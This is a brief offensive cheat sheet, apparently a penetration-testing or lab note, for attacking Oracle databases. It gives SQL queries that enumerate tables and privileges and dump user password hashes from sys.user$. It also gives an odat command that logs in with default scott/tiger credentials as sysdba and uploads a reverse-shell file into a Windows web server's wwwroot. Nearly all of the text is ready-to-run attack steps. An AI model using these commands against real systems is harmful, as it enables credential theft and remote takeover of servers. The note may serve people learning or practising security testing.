# CheatSheet
```SQL
SQL> SELECT table_name FROM all_tables;
SQL> SELECT * FROM user_role_privs;
SQL> select name, password from sys.user$;
```
Note: We can upload a [[Reverse Shell]] if the web server is running, using [[odat]]
```bash
$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot <shell-file> ./<shell-file>
```